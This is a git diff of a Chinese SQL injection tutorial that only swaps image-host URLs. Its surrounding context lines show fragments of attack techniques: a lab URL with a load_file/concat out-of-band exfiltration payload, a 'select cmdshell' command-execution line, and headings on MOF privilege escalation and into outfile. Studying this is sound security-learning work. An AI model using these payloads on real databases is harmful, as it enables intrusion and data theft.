@@ -5,7 +5,7 @@
 
 SQL注入攻击是黑客利用SQL注入对数据库进行攻击的常用手段之一。攻击者通过浏览器或其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过滤，便将SQL语句带入数据库执行。SQL注入过程如图所示。
 
-![](https://image.geoer.cn/img/image-20220119193306514.png)
+![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/img/image-20220119193306514.png)
 
 
 
@@ -411,7 +411,7 @@ http://127.0.0.1:8080/sqlilabs/less-2/?id=-1 and if((select load_file(concat('\\
 
 ```
 
-![](https://image.geoer.cn/img/image-20220119192501632.png)
+![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/img/image-20220119192501632.png)
 
 
 
@@ -503,7 +503,7 @@ Rows matched: 4  Changed: 4  Warnings: 0
 
 ## 二次注入
 
-![](https://image.geoer.cn/img/image-20220119175625531.png)
+![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/img/image-20220119175625531.png)
 
 二次注入的语句：在没有被单引号包裹的sql语句下，我们可以用16进制编码，这样就不会带有单引号等。
 
@@ -608,19 +608,19 @@ into dumpfile
 
 **load_file:**
 
-![](https://image.geoer.cn/img/image-20220119190821425.png)
+![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/img/image-20220119190821425.png)
 
 
 
 **secure_file_priv:**
 
-![](https://image.geoer.cn/img/image-20220119190851930.png)
+![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/img/image-20220119190851930.png)
 
 
 
 **into outfile:**
 
-![](https://image.geoer.cn/img/image-20220119190916033.png)
+![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/img/image-20220119190916033.png)
 
 
 
@@ -765,7 +765,7 @@ select cmdshell('命令')	# 就可以执行命令了
 
 ### 2.MOF加载提权
 
-![](https://image.geoer.cn/img/image-20220119190452993.png)
+![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/img/image-20220119190452993.png)
 
 系统目录中的mof/目录下有mof文件，目录下面的文件会被系统调用执行。
 
@@ -2078,7 +2078,7 @@ select name, deferred_value, dbpartitionnum from sysibmadm.dbcfg -- Requires pri
 
 把每个SQL关键字两侧可插入的点称之为“位”，如下图：
 
-![](https://image.geoer.cn/img/image-20220119124547715.png)
+![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/img/image-20220119124547715.png)
 
 
 
